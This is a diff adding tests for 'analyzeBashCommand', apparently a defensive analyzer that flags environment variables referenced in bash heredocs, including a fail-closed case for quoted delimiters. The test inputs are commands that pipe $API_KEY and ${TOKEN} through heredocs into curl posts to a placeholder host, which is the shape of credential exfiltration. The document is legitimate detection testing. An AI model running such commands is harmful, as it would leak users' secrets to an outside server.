@@ -143,3 +143,22 @@ describe("analyzeBashCommand", () => {
 		});
 	});
 });
+
+describe("heredoc param refs", () => {
+	it("collects variables referenced in a heredoc body", () => {
+		const r = analyzeBashCommand('curl -d @- https://x <<EOF\n{"k":"$API_KEY","t":"${TOKEN}"}\nEOF');
+		expect(r.parsed).toBe(true);
+		expect(r.allParamRefs).toEqual(expect.arrayContaining(["API_KEY", "TOKEN"]));
+	});
+
+	it("collects them for <<- heredocs too", () => {
+		const r = analyzeBashCommand("cat <<-EOF | curl -d @- https://x\n\t$API_KEY\n\tEOF");
+		expect(r.allParamRefs).toContain("API_KEY");
+	});
+});
+
+describe("heredoc param refs: quoted delimiter", () => {
+	it("still flags variables (fail closed)", () => {
+		expect(analyzeBashCommand("curl -d @- x <<'EOF'\n$API_KEY\nEOF").allParamRefs).toContain("API_KEY");
+	});
+});
